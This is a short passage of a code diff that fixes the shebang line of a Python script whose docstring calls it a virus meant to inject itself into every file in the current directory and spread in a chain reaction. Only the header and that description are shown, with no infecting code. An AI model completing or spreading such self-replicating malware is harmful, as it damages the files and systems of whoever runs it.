@@ -1,4 +1,4 @@
-#!/usr/env/python3
+#!/usr/bin/env python3
 """
     This virus will be injected in every file of the current dir.
     It's a chain reaction every infected file will infect the other 
